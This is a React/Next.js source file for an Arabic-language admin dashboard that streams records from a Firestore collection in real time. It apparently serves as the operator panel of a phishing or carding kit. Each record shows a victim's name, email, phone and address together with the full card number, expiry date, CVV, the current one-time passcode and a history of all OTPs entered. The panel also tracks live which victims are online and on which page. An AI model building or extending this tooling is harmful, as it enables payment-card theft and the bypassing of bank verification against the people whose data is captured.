"use client"

import { useEffect, useState, useMemo } from "react"
import { collection, onSnapshot, doc, deleteDoc } from "firebase/firestore"
import { db } from "@/lib/firestore"
import { ref, onValue } from "firebase/database"
import { database } from "@/lib/firestore"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { useToast } from "@/hooks/use-toast"
import { CreditCard, CheckCircle, Clock, Search, Users, Activity, Trash2 } from "lucide-react"
import { formatDistanceToNow } from "date-fns"
import { ar } from "date-fns/locale"
import { Suspense } from "react"

interface PersonalInfo {
  firstName?: string
  lastName?: string
  email?: string
  phone?: string
  address?: string
  city?: string
}

interface CardInfo {
  cardNumber?: string
  cardName?: string
  expiryDate?: string
  cvv?: string
}

interface Notification {
  id: string
  createdDate?: string
  personalInfo?: PersonalInfo
  cardInfo?: CardInfo
  status?: "pending" | "approved" | "rejected" | string
  isOnline?: boolean
  lastSeen?: string
  currentPage?: string
  otp?: string
  allOtps?: string[] | null
}

// Personal Information Card Component
function PersonalInfoCard({
  notification,
}: {
  notification: Notification
}) {
  const info = notification.personalInfo

  return (
    <Card className="border-2 border-blue-200 bg-gradient-to-br from-blue-50 to-blue-100/50 shadow-lg">
      <CardHeader className="pb-3">
        <div className="flex items-center gap-3">
          <div className="w-12 h-12 rounded-full bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center shadow-md">
            <Users className="h-6 w-6 text-white" />
          </div>
          <div>
            <CardTitle className="text-lg text-gray-800">معلومات شخصية</CardTitle>
            <CardDescription className="text-sm">
              {notification.createdDate
                ? formatDistanceToNow(new Date(notification.createdDate), {
                    addSuffix: true,
                    locale: ar,
                  })
                : "غير متوفر"}
            </CardDescription>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {info?.firstName && (
            <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-blue-200 shadow-sm">
              <span className="text-xs font-medium text-gray-600">الاسم الأول</span>
              <span className="font-semibold text-base text-gray-800">{info.firstName}</span>
            </div>
          )}
          {info?.lastName && (
            <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-blue-200 shadow-sm">
              <span className="text-xs font-medium text-gray-600">الاسم الأخير</span>
              <span className="font-semibold text-base text-gray-800">{info.lastName}</span>
            </div>
          )}
          {info?.email && (
            <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-blue-200 shadow-sm">
              <span className="text-xs font-medium text-gray-600">البريد الإلكتروني</span>
              <span className="font-semibold text-base text-gray-800 break-all">{info.email}</span>
            </div>
          )}
          {info?.phone && (
            <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-blue-200 shadow-sm">
              <span className="text-xs font-medium text-gray-600">رقم الهاتف</span>
              <span className="font-semibold text-base text-gray-800 font-mono">{info.phone}</span>
            </div>
          )}
          {info?.address && (
            <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-blue-200 shadow-sm">
              <span className="text-xs font-medium text-gray-600">العنوان</span>
              <span className="font-semibold text-base text-gray-800">{info.address}</span>
            </div>
          )}
          {info?.city && (
            <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-blue-200 shadow-sm">
              <span className="text-xs font-medium text-gray-600">المدينة</span>
              <span className="font-semibold text-base text-gray-800">{info.city}</span>
            </div>
          )}
        </div>
      </CardContent>
    </Card>
  )
}

// Card Information Component
function CardInfoCard({
  notification,
}: {
  notification: Notification
}) {
  const card = notification.cardInfo

  return (
    <Card className="border-2 border-green-200 bg-gradient-to-br from-green-50 to-green-100/50 shadow-lg">
      <CardHeader className="pb-3">
        <div className="flex items-center gap-3">
          <div className="w-12 h-12 rounded-full bg-gradient-to-br from-green-500 to-green-600 flex items-center justify-center shadow-md">
            <CreditCard className="h-6 w-6 text-white" />
          </div>
          <div>
            <CardTitle className="text-lg text-gray-800">معلومات البطاقة</CardTitle>
            <CardDescription className="text-sm">
              {notification.createdDate
                ? formatDistanceToNow(new Date(notification.createdDate), {
                    addSuffix: true,
                    locale: ar,
                  })
                : "غير متوفر"}
            </CardDescription>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        {card?.cardNumber ? (
          <div className="space-y-3">
            <div className="grid grid-cols-1 gap-4">
              {card.cardNumber && (
                <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                  <span className="text-xs font-medium text-gray-600">رقم البطاقة</span>
                  <span className="font-bold text-base text-gray-800 font-mono tracking-wider">{card.cardNumber}</span>
                </div>
              )}
              {card.cardName && (
                <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                  <span className="text-xs font-medium text-gray-600">اسم البطاقة</span>
                  <span className="font-bold text-base text-gray-800">{card.cardName}</span>
                </div>
              )}
              {card.expiryDate && (
                <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                  <span className="text-xs font-medium text-gray-600">تاريخ الانتهاء</span>
                  <span className="font-bold text-base text-gray-800 font-mono">{card.expiryDate}</span>
                </div>
              )}
              {card.cvv && (
                <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                  <span className="text-xs font-medium text-gray-600">CVV</span>
                  <span className="font-bold text-base text-green-600 font-mono">{card.cvv}</span>
                </div>
              )}
            </div>
          </div>
        ) : (
          <div className="text-center py-8 bg-white rounded-lg border border-dashed border-green-300">
            <CreditCard className="h-12 w-12 mx-auto text-green-400 mb-3" />
            <p className="text-gray-600 font-medium">لا توجد معلومات بطاقة مسجلة</p>
          </div>
        )}
      </CardContent>
    </Card>
  )
}

// OTP Information Card Component
function OtpInfoCard({
  notification,
}: {
  notification: Notification
}) {
  return (
    <Card className="border-2 border-purple-200 bg-gradient-to-br from-purple-50 to-purple-100/50 shadow-lg">
      <CardHeader className="pb-3">
        <div className="flex items-center gap-3">
          <div className="w-12 h-12 rounded-full bg-gradient-to-br from-purple-500 to-purple-600 flex items-center justify-center shadow-md">
            <Clock className="h-6 w-6 text-white" />
          </div>
          <div>
            <CardTitle className="text-lg text-gray-800">معلومات التحقق</CardTitle>
            <CardDescription className="text-sm">
              {notification.createdDate
                ? formatDistanceToNow(new Date(notification.createdDate), {
                    addSuffix: true,
                    locale: ar,
                  })
                : "غير متوفر"}
            </CardDescription>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="grid grid-cols-1 gap-4">
          {notification.currentPage && (
            <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-purple-200 shadow-sm">
              <span className="text-xs font-medium text-gray-600">الصفحة الحالية</span>
              <span className="font-semibold text-base text-gray-800">{notification.currentPage}</span>
            </div>
          )}
          {notification.otp && (
            <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-purple-200 shadow-sm">
              <span className="text-xs font-medium text-gray-600">رمز التحقق الحالي</span>
              <span className="font-bold text-base text-purple-600 font-mono text-lg tracking-widest">
                {notification.otp}
              </span>
            </div>
          )}
          {notification.allOtps && notification.allOtps.length > 0 && (
            <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-purple-200 shadow-sm">
              <span className="text-xs font-medium text-gray-600 mb-3">جميع أرمز التحقق</span>
              <div className="space-y-2">
                {notification.allOtps.map((otp, index) => (
                  <div
                    key={index}
                    className="flex items-center justify-between p-2 bg-purple-50 rounded border border-purple-100"
                  >
                    <span className="font-mono font-bold text-purple-600">{otp}</span>
                    <span className="text-xs text-gray-500">رمز {index + 1}</span>
                  </div>
                ))}
              </div>
            </div>
          )}
          {!notification.otp && (!notification.allOtps || notification.allOtps.length === 0) && (
            <div className="text-center py-8 bg-white rounded-lg border border-dashed border-purple-300">
              <Clock className="h-12 w-12 mx-auto text-purple-400 mb-3" />
              <p className="text-gray-600 font-medium">لا توجد معلومات تحقق مسجلة</p>
            </div>
          )}
        </div>
      </CardContent>
    </Card>
  )
}

// Hook to count online users
function useOnlineUsersCount() {
  const [count, setCount] = useState(0)

  useEffect(() => {
    const statusRef = ref(database, "/status")
    const unsubscribe = onValue(statusRef, (snapshot) => {
      let onlineCount = 0
      snapshot.forEach((childSnapshot) => {
        const data = childSnapshot.val()
        if (data && data.state === "online") {
          onlineCount++
        }
      })
      setCount(onlineCount)
    })

    return () => unsubscribe()
  }, [])

  return count
}

function NotificationsContent() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [selectedTab, setSelectedTab] = useState<"personal" | "card" | "otp" | null>(null)
  const [filterType, setFilterType] = useState<"all" | "card" | "online" | "otp">("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage] = useState(10)
  const onlineUsersCount = useOnlineUsersCount()
  const { toast } = useToast()

  // Track online status
  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})

  useEffect(() => {
    const statusRefs: { [key: string]: () => void } = {}
    notifications.forEach((notification) => {
      const userStatusRef = ref(database, `/status/${notification.id}`)
      const callback = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }))
      })
      statusRefs[notification.id] = callback
    })

    return () => {
      Object.values(statusRefs).forEach((unsubscribe) => {
        if (typeof unsubscribe === "function") {
          unsubscribe()
        }
      })
    }
  }, [notifications])

  // Statistics
  const totalVisitorsCount = notifications.length
  const cardSubmissionsCount = notifications.filter((n) => n.cardInfo?.cardNumber).length
  const otpSubmissionsCount = notifications.filter((n) => n.otp).length

  // Filter and search
  const filteredNotifications = useMemo(() => {
    let filtered = notifications

    if (filterType === "card") {
      filtered = filtered.filter((notification) => notification.cardInfo?.cardNumber)
    } else if (filterType === "online") {
      filtered = filtered.filter((notification) => onlineStatuses[notification.id])
    } else if (filterType === "otp") {
      filtered = filtered.filter((notification) => notification.otp)
    }

    if (searchTerm) {
      const term = searchTerm.toLowerCase()
      filtered = filtered.filter(
        (notification) =>
          notification.personalInfo?.firstName?.toLowerCase().includes(term) ||
          notification.personalInfo?.lastName?.toLowerCase().includes(term) ||
          notification.personalInfo?.email?.toLowerCase().includes(term) ||
          notification.personalInfo?.phone?.toLowerCase().includes(term) ||
          notification.cardInfo?.cardNumber?.toLowerCase().includes(term) ||
          notification.otp?.toLowerCase().includes(term) ||
          notification.currentPage?.toLowerCase().includes(term) ||
          notification.allOtps?.some((otp) => otp.toLowerCase().includes(term)),
      )
    }

    return filtered
  }, [notifications, filterType, searchTerm, onlineStatuses])

  // Pagination
  const indexOfLastItem = currentPage * itemsPerPage
  const indexOfFirstItem = indexOfLastItem - itemsPerPage
  const currentItems = filteredNotifications.slice(indexOfFirstItem, indexOfLastItem)
  const totalPages = Math.ceil(filteredNotifications.length / itemsPerPage)

  // Fetch notifications
  useEffect(() => {
    const unsubscribe = onSnapshot(
      collection(db, "pays"),
      (snapshot) => {
        const notificationsData = snapshot.docs.map((doc) => ({
          id: doc.id,
          ...doc.data(),
        })) as Notification[]

        const sortedNotifications = notificationsData.sort((a, b) => {
          const dateA = a.createdDate ? new Date(a.createdDate).getTime() : 0
          const dateB = b.createdDate ? new Date(b.createdDate).getTime() : 0
          return dateB - dateA
        })

        setNotifications(sortedNotifications)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
        toast({
          title: "خطأ في جلب البيانات",
          description: "حدث خطأ أثناء جلب الإشعارات",
          variant: "destructive",
        })
      },
    )

    return unsubscribe
  }, [toast])

  const handleDelete = async (id: string) => {
    try {
      await deleteDoc(doc(db, "pays", id))
      setNotifications(notifications.filter((n) => n.id !== id))
      toast({
        title: "تم الحذف",
        description: "تم حذف السجل بنجاح",
      })
    } catch (error) {
      console.error("Error deleting document:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء حذف السجل",
        variant: "destructive",
      })
    }
  }

  const closeDialog = () => {
    setSelectedNotification(null)
    setSelectedTab(null)
  }

  if (isLoading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gradient-to-br from-gray-50 to-gray-100">
        <div className="text-center space-y-4">
          <div className="animate-spin h-12 w-12 border-4 border-orange-600 border-t-transparent rounded-full mx-auto"></div>
          <p className="text-gray-600 font-medium">جاري تحميل البيانات...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 p-6" dir="rtl">
      <div className="max-w-7xl mx-auto space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold text-gray-800">لوحة التحكم</h1>
            <p className="text-gray-600 mt-1">إدارة البيانات المسجلة</p>
          </div>
        </div>

        {/* Statistics Cards */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
          <Card className="border-0 shadow-lg bg-gradient-to-br from-blue-500 to-blue-600 text-white">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-blue-100 text-sm font-medium">إجمالي الزوار</p>
                  <p className="text-3xl font-bold mt-2">{totalVisitorsCount}</p>
                </div>
                <Users className="h-12 w-12 text-blue-200" />
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-lg bg-gradient-to-br from-green-500 to-green-600 text-white">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-green-100 text-sm font-medium">البطاقات المقدمة</p>
                  <p className="text-3xl font-bold mt-2">{cardSubmissionsCount}</p>
                </div>
                <CreditCard className="h-12 w-12 text-green-200" />
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-lg bg-gradient-to-br from-purple-500 to-purple-600 text-white">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-purple-100 text-sm font-medium">طلبات التحقق</p>
                  <p className="text-3xl font-bold mt-2">{otpSubmissionsCount}</p>
                </div>
                <Clock className="h-12 w-12 text-purple-200" />
              </div>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-lg bg-gradient-to-br from-indigo-500 to-indigo-600 text-white">
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-indigo-100 text-sm font-medium">متصل الآن</p>
                  <p className="text-3xl font-bold mt-2">{onlineUsersCount}</p>
                </div>
                <Activity className="h-12 w-12 text-indigo-200" />
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Filters and Search */}
        <Card className="border-0 shadow-lg">
          <CardContent className="p-6">
            <div className="flex flex-col md:flex-row gap-4">
              <div className="flex-1">
                <div className="relative">
                  <Search className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
                  <Input
                    placeholder="البحث بالاسم أو البريد أو الهاتف أو رقم البطاقة أو رمز التحقق..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="pr-10 h-11"
                  />
                </div>
              </div>
              <div className="flex gap-2">
                <Button
                  variant={filterType === "all" ? "default" : "outline"}
                  onClick={() => setFilterType("all")}
                  className={filterType === "all" ? "bg-blue-600 hover:bg-blue-700" : ""}
                >
                  الكل
                </Button>
                <Button
                  variant={filterType === "card" ? "default" : "outline"}
                  onClick={() => setFilterType("card")}
                  className={filterType === "card" ? "bg-green-600 hover:bg-green-700" : ""}
                >
                  البطاقات
                </Button>
                <Button
                  variant={filterType === "otp" ? "default" : "outline"}
                  onClick={() => setFilterType("otp")}
                  className={filterType === "otp" ? "bg-purple-600 hover:bg-purple-700" : ""}
                >
                  التحقق
                </Button>
                <Button
                  variant={filterType === "online" ? "default" : "outline"}
                  onClick={() => setFilterType("online")}
                  className={filterType === "online" ? "bg-indigo-600 hover:bg-indigo-700" : ""}
                >
                  متصل
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Notifications Table */}
        <Card className="border-0 shadow-lg">
          <CardContent className="p-0">
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-100 border-b">
                  <tr>
                    <th className="px-6 py-4 text-right text-sm font-semibold text-gray-700">الاسم</th>
                    <th className="px-6 py-4 text-right text-sm font-semibold text-gray-700">البريد الإلكتروني</th>
                    <th className="px-6 py-4 text-right text-sm font-semibold text-gray-700">الهاتف</th>
                    <th className="px-6 py-4 text-right text-sm font-semibold text-gray-700">البطاقة</th>
                    <th className="px-6 py-4 text-right text-sm font-semibold text-gray-700">التحقق</th>
                    <th className="px-6 py-4 text-right text-sm font-semibold text-gray-700">الإجراءات</th>
                  </tr>
                </thead>
                <tbody className="divide-y">
                  {currentItems.map((notification) => (
                    <tr key={notification.id} className="hover:bg-gray-50 transition-colors">
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-3">
                          <div
                            className={`w-3 h-3 rounded-full ${
                              onlineStatuses[notification.id] ? "bg-green-500 animate-pulse" : "bg-gray-300"
                            }`}
                          ></div>
                          <div>
                            <p className="font-semibold text-gray-800">
                              {notification.personalInfo?.firstName} {notification.personalInfo?.lastName}
                            </p>
                            {notification.createdDate && (
                              <p className="text-xs text-gray-400">
                                {formatDistanceToNow(new Date(notification.createdDate), {
                                  addSuffix: true,
                                  locale: ar,
                                })}
                              </p>
                            )}
                          </div>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <p className="text-sm text-gray-700">{notification.personalInfo?.email || "غير متوفر"}</p>
                      </td>
                      <td className="px-6 py-4">
                        <p className="text-sm text-gray-700 font-mono">
                          {notification.personalInfo?.phone || "غير متوفر"}
                        </p>
                      </td>
                      <td className="px-6 py-4">
                        {notification.cardInfo?.cardNumber ? (
                          <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
                            <CheckCircle className="h-3 w-3 ml-1" />
                            بطاقة موجودة
                          </Badge>
                        ) : (
                          <Badge variant="secondary">لا توجد بطاقة</Badge>
                        )}
                      </td>
                      <td className="px-6 py-4">
                        {notification.otp ? (
                          <Badge className="bg-gradient-to-r from-purple-500 to-purple-600 text-white">
                            <CheckCircle className="h-3 w-3 ml-1" />
                            {notification.otp.substring(0, 3)}...
                          </Badge>
                        ) : (
                          <Badge variant="secondary">بدون تحقق</Badge>
                        )}
                      </td>
                      <td className="px-6 py-4 flex gap-2">
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => {
                            setSelectedNotification(notification)
                            setSelectedTab("personal")
                          }}
                        >
                          التفاصيل
                        </Button>
                        <Button
                          className="h-8"
                          variant="destructive"
                          size="icon"
                          onClick={() => handleDelete(notification.id)}
                        >
                          <Trash2 className="h-4" />
                        </Button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {/* Pagination */}
            {totalPages > 1 && (
              <div className="flex items-center justify-between px-6 py-4 border-t">
                <p className="text-sm text-gray-600">
                  عرض {indexOfFirstItem + 1} إلى {Math.min(indexOfLastItem, filteredNotifications.length)} من{" "}
                  {filteredNotifications.length}
                </p>
                <div className="flex gap-2">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setCurrentPage(currentPage - 1)}
                    disabled={currentPage === 1}
                  >
                    السابق
                  </Button>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setCurrentPage(currentPage + 1)}
                    disabled={currentPage === totalPages}
                  >
                    التالي
                  </Button>
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        {/* OTP Information Section */}
        {selectedNotification && selectedTab === "otp" && (
          <div className="mt-6">
            <OtpInfoCard notification={selectedNotification} />
          </div>
        )}

        {/* Other Info Cards */}
        {selectedNotification && selectedTab === "personal" && <PersonalInfoCard notification={selectedNotification} />}
        {selectedNotification && selectedTab === "card" && <CardInfoCard notification={selectedNotification} />}
      </div>

      {/* Dialog */}
      <Dialog open={selectedTab !== null} onOpenChange={closeDialog}>
        <DialogContent className="max-w-2xl max-h-[80vh] overflow-y-auto" dir="rtl">
          <DialogHeader>
            <DialogTitle>
              {selectedTab === "personal"
                ? "المعلومات الشخصية"
                : selectedTab === "card"
                  ? "معلومات البطاقة"
                  : "معلومات التحقق"}
            </DialogTitle>
          </DialogHeader>

          {selectedTab === "personal" && selectedNotification && (
            <PersonalInfoCard notification={selectedNotification} />
          )}
          {selectedTab === "card" && selectedNotification && <CardInfoCard notification={selectedNotification} />}
          {selectedTab === "otp" && selectedNotification && <OtpInfoCard notification={selectedNotification} />}
        </DialogContent>
      </Dialog>
    </div>
  )
}

export default function NotificationsPage() {
  return (
    <Suspense fallback={<div>جاري التحميل...</div>}>
      <NotificationsContent />
    </Suspense>
  )
}
